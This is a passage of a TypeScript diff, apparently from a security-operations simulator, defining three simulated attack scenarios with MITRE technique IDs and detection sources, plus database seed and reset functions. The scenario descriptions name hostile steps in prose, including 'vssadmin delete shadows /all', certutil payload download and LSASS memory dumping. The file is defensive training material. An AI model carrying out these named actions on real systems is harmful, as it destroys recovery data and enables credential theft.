+      'Simulates a complete 6-stage ransomware kill chain: spearphishing email with malicious macro -> certutil download -> LSASS memory dump -> PsExec lateral movement to DC -> Volume Shadow Copy wipe -> ransom deployment.',
     attackChainSteps: [
-      { stage: '1. Initial Access', technique: 'T1566.001 Spearphishing', action: 'Accountant opens weaponized Invoice_Q3_2026.xlsm macro', detectionSource: 'Email Gateway & Elastic' },
-      { stage: '2. Execution', technique: 'T1218.011 LOLBins certutil', action: 'certutil.exe used to bypass proxy and download stage2.bin payload', detectionSource: 'Splunk WinEventLog 4688' },
-      { stage: '3. Credential Theft', technique: 'T1003.001 LSASS Injection', action: 'Injected process attempts to read LSASS process memory for domain hashes', detectionSource: 'Sophos XDR Behavioral AI' },
-      { stage: '4. C2 Beaconing', technique: 'T1071.004 C2 TLS Channel', action: 'Encrypted beaconing established to Cobalt Strike team server', detectionSource: 'Zeek Network & PA Firewall' },
-      { stage: '5. Lateral Movement', technique: 'T1021.002 SMB / PsExec', action: 'Adversary deploys PSEXESVC service on DC-CORP-01 using harvested credentials', detectionSource: 'Splunk WinEventLog 7045' },
-      { stage: '6. Impact', technique: 'T1490 Inhibit Recovery', action: 'Execution of vssadmin delete shadows /all to prevent restore', detectionSource: 'LogAI Anomaly Engine' },
+      {
+        stage: '1. Initial Access',
+        technique: 'T1566.001 Spearphishing',
+        action: 'Accountant opens weaponized Invoice_Q3_2026.xlsm macro',
+        detectionSource: 'Email Gateway & Elastic',
+      },
+      {
+        stage: '2. Execution',
+        technique: 'T1218.011 LOLBins certutil',
+        action: 'certutil.exe used to bypass proxy and download stage2.bin payload',
+        detectionSource: 'Splunk WinEventLog 4688',
+      },
+      {
+        stage: '3. Credential Theft',
+        technique: 'T1003.001 LSASS Injection',
+        action: 'Injected process attempts to read LSASS process memory for domain hashes',
+        detectionSource: 'Sophos XDR Behavioral AI',
+      },
+      {
+        stage: '4. C2 Beaconing',
+        technique: 'T1071.004 C2 TLS Channel',
+        action: 'Encrypted beaconing established to Cobalt Strike team server',
+        detectionSource: 'Zeek Network & PA Firewall',
+      },
+      {
+        stage: '5. Lateral Movement',
+        technique: 'T1021.002 SMB / PsExec',
+        action: 'Adversary deploys PSEXESVC service on DC-CORP-01 using harvested credentials',
+        detectionSource: 'Splunk WinEventLog 7045',
+      },
+      {
+        stage: '6. Impact',
+        technique: 'T1490 Inhibit Recovery',
+        action: 'Execution of vssadmin delete shadows /all to prevent restore',
+        detectionSource: 'LogAI Anomaly Engine',
+      },
     ],
     mitreCoverage: ['T1566.001', 'T1218.011', 'T1003.001', 'T1071.004', 'T1021.002', 'T1490', 'T1486'],
     recommendedPlaybookId: 'PB-RANSOMWARE-01',
@@ -888,12 +969,33 @@ export const ATTACK_SCENARIOS: AttackScenario[] = [
     name: 'Cloud Infrastructure Hijack & S3 Data Exfiltration',
     adversary: 'Scattered Spider / Threat Group 4127',
     severity: 'high',
-    description: 'Simulates cloud credential theft via leaked CI/CD pipeline token, reconnaissance across AWS resources, IAM privilege escalation, backdoor policy injection, and sensitive snapshot exfiltration.',
+    description:
+      'Simulates cloud credential theft via leaked CI/CD pipeline token, reconnaissance across AWS resources, IAM privilege escalation, backdoor policy injection, and sensitive snapshot exfiltration.',
     attackChainSteps: [
-      { stage: '1. Initial Access', technique: 'T1078.004 Leaked Cloud Token', action: 'Adversary leverages exposed AWS STS token from GitHub repository', detectionSource: 'AWS CloudTrail' },
-      { stage: '2. Discovery', technique: 'T1526 Cloud Service Discovery', action: 'Calling DescribeBuckets, ListUsers, and GetAccountSummary', detectionSource: 'Splunk SIEM' },
-      { stage: '3. Persistence', technique: 'T1098.001 IAM Policy Backdoor', action: 'Injected PutBucketPolicy with wildcard access to external account', detectionSource: 'CloudTrail Anomaly Filter' },
-      { stage: '4. Exfiltration', technique: 'T1567 Exfiltration Over Cloud', action: 'Streaming 42GB of encrypted finance snapshots to external S3 bucket', detectionSource: 'VPC Flow Logs & Alkido' },
+      {
+        stage: '1. Initial Access',
+        technique: 'T1078.004 Leaked Cloud Token',
+        action: 'Adversary leverages exposed AWS STS token from GitHub repository',
+        detectionSource: 'AWS CloudTrail',
+      },
+      {
+        stage: '2. Discovery',
+        technique: 'T1526 Cloud Service Discovery',
+        action: 'Calling DescribeBuckets, ListUsers, and GetAccountSummary',
+        detectionSource: 'Splunk SIEM',
+      },
+      {
+        stage: '3. Persistence',
+        technique: 'T1098.001 IAM Policy Backdoor',
+        action: 'Injected PutBucketPolicy with wildcard access to external account',
+        detectionSource: 'CloudTrail Anomaly Filter',
+      },
+      {
+        stage: '4. Exfiltration',
+        technique: 'T1567 Exfiltration Over Cloud',
+        action: 'Streaming 42GB of encrypted finance snapshots to external S3 bucket',
+        detectionSource: 'VPC Flow Logs & Alkido',
+      },
     ],
     mitreCoverage: ['T1078.004', 'T1098.001', 'T1567'],
     recommendedPlaybookId: 'PB-CLOUD-IAM-03',
@@ -903,13 +1005,99 @@ export const ATTACK_SCENARIOS: AttackScenario[] = [
     name: 'Stealth Insider Threat & Covert DNS Tunneling',
     adversary: 'Rogue Disgruntled Contractor',
     severity: 'high',
-    description: 'Simulates an authenticated insider abusing legitimate access to dump sensitive customer SQL records, compress them with high entropy, and exfiltrate over UDP port 53 DNS tunnels.',
+    description:
+      'Simulates an authenticated insider abusing legitimate access to dump sensitive customer SQL records, compress them with high entropy, and exfiltrate over UDP port 53 DNS tunnels.',
     attackChainSteps: [
-      { stage: '1. Collection', technique: 'T1005 Data from Local System', action: 'Mass SQL query extraction of customer SSNs and credit records', detectionSource: 'Database Audit Log' },
-      { stage: '2. Defense Evasion', technique: 'T1027 Obfuscated Files', action: 'Encrypting data payload into base64 hex chunks', detectionSource: 'Alkido Entropy Monitor' },
-      { stage: '3. C2 & Exfil', technique: 'T1071.004 DNS Tunneling', action: 'Chunked exfiltration through recursive DNS lookups at 180 queries/min', detectionSource: 'Palo Alto Threat Engine' },
+      {
+        stage: '1. Collection',
+        technique: 'T1005 Data from Local System',
+        action: 'Mass SQL query extraction of customer SSNs and credit records',
+        detectionSource: 'Database Audit Log',
+      },
+      {
+        stage: '2. Defense Evasion',
+        technique: 'T1027 Obfuscated Files',
+        action: 'Encrypting data payload into base64 hex chunks',
+        detectionSource: 'Alkido Entropy Monitor',
+      },
+      {
+        stage: '3. C2 & Exfil',
+        technique: 'T1071.004 DNS Tunneling',
+        action: 'Chunked exfiltration through recursive DNS lookups at 180 queries/min',
+        detectionSource: 'Palo Alto Threat Engine',
+      },
     ],
     mitreCoverage: ['T1005', 'T1027', 'T1071.004'],
     recommendedPlaybookId: 'PB-DNS-TUNNEL-02',
   },
 ];
+
+async function countRows(tableName: string): Promise<number> {
+  const result = await db.execute(sql.raw(`SELECT COUNT(*)::int AS cnt FROM ${tableName}`));
+  const row = (result as any).rows?.[0];
+  return Number(row?.cnt || 0);
+}
+
+/**
+ * Ensures PostgreSQL contains real baseline operational data if any table is empty.
+ */
+export async function ensureBaselineDatabase(): Promise<void> {
+  try {
+    if ((await countRows('siem_connectors')) === 0) {
+      await db.insert(siemConnectors).values(BASELINE_CONNECTORS).onConflictDoNothing();
+    }
+    if ((await countRows('security_logs')) === 0) {
+      await db.insert(securityLogs).values(BASELINE_LOGS).onConflictDoNothing();
+    }
+    if ((await countRows('security_alerts')) === 0) {
+      await db.insert(securityAlerts).values(BASELINE_ALERTS).onConflictDoNothing();
+    }
+    if ((await countRows('endpoints')) === 0) {
+      await db.insert(endpoints).values(BASELINE_ENDPOINTS).onConflictDoNothing();
+    }
+    if ((await countRows('threat_intel')) === 0) {
+      await db.insert(threatIntel).values(BASELINE_THREAT_INTEL).onConflictDoNothing();
+    }
+    if ((await countRows('mitre_techniques')) === 0) {
+      await db.insert(mitreTechniques).values(BASELINE_MITRE).onConflictDoNothing();
+    }
+    if ((await countRows('soar_playbooks')) === 0) {
+      await db.insert(soarPlaybooks).values(BASELINE_PLAYBOOKS).onConflictDoNothing();
+    }
+    if ((await countRows('ueba_profiles')) === 0) {
+      await db.insert(uebaProfiles).values(BASELINE_UEBA).onConflictDoNothing();
+    }
+    if ((await countRows('attack_scenarios')) === 0) {
+      await db.insert(attackScenarios).values(BASELINE_SCENARIOS).onConflictDoNothing();
+    }
+  } catch (err) {
+    console.error('[AegisSOC Seed] Baseline database initialization failed:', err);
+  }
+}
+
+/**
+ * Resets operational SOC tables in PostgreSQL to baseline state.
+ */
+export async function resetDatabaseToBaseline(): Promise<void> {
+  await db.delete(incidentActions);
+  await db.delete(playbookExecutions);
+  await db.delete(securityAlerts);
+  await db.delete(securityLogs);
+  await db.delete(endpoints);
+  await db.delete(threatIntel);
+  await db.delete(mitreTechniques);
+  await db.delete(soarPlaybooks);
+  await db.delete(uebaProfiles);
+  await db.delete(attackScenarios);
+  await db.delete(siemConnectors);
+
+  await db.insert(siemConnectors).values(BASELINE_CONNECTORS).onConflictDoNothing();
+  await db.insert(securityLogs).values(BASELINE_LOGS).onConflictDoNothing();
+  await db.insert(securityAlerts).values(BASELINE_ALERTS).onConflictDoNothing();
+  await db.insert(endpoints).values(BASELINE_ENDPOINTS).onConflictDoNothing();
+  await db.insert(threatIntel).values(BASELINE_THREAT_INTEL).onConflictDoNothing();
+  await db.insert(mitreTechniques).values(BASELINE_MITRE).onConflictDoNothing();
+  await db.insert(soarPlaybooks).values(BASELINE_PLAYBOOKS).onConflictDoNothing();
+  await db.insert(uebaProfiles).values(BASELINE_UEBA).onConflictDoNothing();
+  await db.insert(attackScenarios).values(BASELINE_SCENARIOS).onConflictDoNothing();
+}
